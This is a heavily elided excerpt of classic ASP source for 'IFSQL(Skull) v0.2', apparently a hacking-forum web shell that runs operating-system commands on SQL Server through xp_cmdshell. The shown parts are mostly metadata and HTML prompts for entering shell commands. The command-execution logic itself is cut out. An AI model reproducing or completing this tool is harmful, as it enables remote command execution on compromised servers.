...
Dim AppName, AppVersion, AppAuthor,AppQQ,AppMail,AppWeb
dim i, strmsg,FileCount

AppName = "IFSQL(Skull)"
AppVersion = "v0.2"
AppAuthor = "IFriend & bbs.1937cn.com"
AppQQ = "QQ:1061956107"
AppMail = "ifriend#qq.com"
AppWeb = "http://bbs.1937cn.com"
...
Sub HtmlHeader()
	Response.Write ("<HTML><HEAD>" & vbnewline & _
	 "<TITLE>"& AppName & " " & AppVersion & " " & AppWeb & " --" & AppAuthor & " " & ServerIP & "</TITLE>" & vbnewline & _
...
Sub XpCmdShell()
	...
	Response.Write ( "<br>" & _
	 ...
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>请输入命令字符串 ：(不要输入xp_cmdshell，直接输入命令即可)</td>" & _
	 "</tr>	  " & _
	 "<tr bgcolor=""#FFFFFF"">" & _
...
Function CmdShell()
  ...
  SI=SI&"<tr><td bgcolor=#F2F2F2><strong>DOS命令行</strong></td></tr>"
